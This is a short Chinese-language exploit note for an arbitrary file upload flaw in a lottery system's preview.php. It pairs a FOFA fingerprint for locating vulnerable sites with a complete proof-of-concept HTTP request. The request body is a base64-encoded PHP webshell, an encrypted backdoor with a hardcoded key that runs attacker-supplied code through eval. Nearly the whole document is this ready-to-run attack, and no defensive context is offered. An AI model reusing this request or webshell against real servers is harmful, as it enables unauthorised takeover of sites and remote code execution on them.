## 彩票系统存在任意文件preview.php上传漏洞

## fofa

```
body="main.e5ee9b2df05fc2d310734b11cc8c911e.css"
```

## poc

```
POST /statics/admin/webuploader/0.1.5/server/preview.php HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Mon, 05 Sep 2022 01:19:50 GMT
If-None-Match: "63154eb6-273"
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 746

data:image/php;base64,PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IAoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/Pg==
```

## 漏洞来源

- http://wiki.fofamini.com/%E6%BC%8F%E6%B4%9E%E5%BA%93/%E8%8F%A0%E8%8F%9C/%E6%9F%90%E8%8F%A0%E8%8F%9C%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(0day).md